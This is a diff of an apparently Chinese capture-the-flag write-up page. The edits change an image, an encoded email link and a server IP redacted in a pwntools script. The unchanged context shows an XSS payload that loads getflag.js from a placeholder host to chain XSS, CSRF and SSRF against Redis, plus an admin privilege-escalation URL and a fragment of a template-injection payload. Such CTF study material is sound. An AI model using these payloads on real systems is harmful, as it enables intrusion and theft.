@@ -326,7 +326,7 @@
 <p><img src="https://images-cdn.shimo.im/8pUCSFkixan0K5tp__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p><img src="https://images-cdn.shimo.im/MTSoi5D81fKG94QZ__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>当我们直接访问这个ssrf_for_test.php时提示“权限不足”，但我们可以借助管理员的身份来触发这个ssrf，即是通过xss+csrf发起一个ssrf请求，提示也告诉flag在redis的flag字段，我们只要抓一下这个数据包，构造出这个过程，然后去接收返回结果就行。(网上已有很多资料，ssrf打redis等等)</p>
-<p><img src="https://images-cdn.shimo.im/jmlVlGtoGbTnYZVq__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/1UxsoMubFbIpKTx4__thumbnail.jpg" srcset="/img/loading.gif" alt="图片"></p>
 <p>注册用户 </p>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;[http://xxxxxxxxx/getflag.js](http://xxxxxxxxx/getflag.js)&gt;&lt;/script&gt;</span></span></code></pre>
 
@@ -392,7 +392,7 @@ exp(<span class="hljs-string">&quot;request.__class__.__getitem__=__builtins__.e
 <h2 id="重来"><a href="#重来" class="headerlink" title="重来"></a>重来</h2><p>访问网站，是个登陆</p>
 <p><img src="https://images-cdn.shimo.im/SyslTmLrOKUiV7qO__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>登陆处发现login.js</p>
-<p><a href="mailto:&#x74;&#x65;&#115;&#x74;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x74;&#x65;&#115;&#x74;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a> test登录</p>
+<p><a href="mailto:&#x74;&#x65;&#115;&#x74;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x74;&#x65;&#115;&#x74;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a> test登录</p>
 <p><img src="https://images-cdn.shimo.im/DQAKRGTWoxXXTZI5__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>更改user为admin，访问，越权成功</p>
 <p><a target="_blank" rel="noopener" href="http://192.144.157.29:8080/a.php?classname=index&param2=admin">http://xxxx.xxx.xxx.xx/a.php?classname=index&amp;param2=admin</a></p>
@@ -790,7 +790,7 @@ p.interactive()</code></pre>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span>
 binary = <span class="hljs-string">&quot;./tnote&quot;</span>
-ip = <span class="hljs-string">&quot;47.98.229.132&quot;</span>
+ip = <span class="hljs-string">&quot;**.**.**.**&quot;</span>
 port = <span class="hljs-number">10000</span>
 elf = ELF(binary)
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip, port, debug</span>):</span>
